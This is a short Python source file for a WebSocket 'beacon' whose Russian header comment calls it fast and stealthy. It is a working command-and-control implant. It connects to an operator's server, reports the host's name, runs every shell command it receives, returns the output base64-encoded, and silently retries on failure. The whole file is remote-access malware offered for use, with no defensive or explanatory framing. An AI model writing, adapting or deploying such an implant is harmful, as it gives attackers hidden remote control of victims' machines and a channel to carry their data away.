#!/usr/bin/env python3
# Argus WebSocket Beacon — быстро, скрытно, современно

import asyncio, websockets, subprocess, base64, json, platform, os, time

class WSBeacon:
    def __init__(self, server_uri, jitter=2):
        self.uri = server_uri
        self.jitter = jitter
        self.hostname = platform.node()
    
    async def connect(self):
        while True:
            try:
                async with websockets.connect(self.uri) as ws:
                    await ws.send(json.dumps({"host": self.hostname, "status": "online"}))
                    while True:
                        cmd = await asyncio.wait_for(ws.recv(), timeout=30)
                        if cmd == "exit":
                            return
                        out = subprocess.getoutput(cmd)
                        await ws.send(base64.b64encode(out.encode()).decode())
            except: pass
            finally:
                await asyncio.sleep(self.jitter)

if __name__ == "__main__":
    import sys
    uri = sys.argv[1] if len(sys.argv) > 1 else "ws://localhost:8765"
    jitter = int(sys.argv[2]) if len(sys.argv) > 2 else 2
    asyncio.run(WSBeacon(uri, jitter).connect())
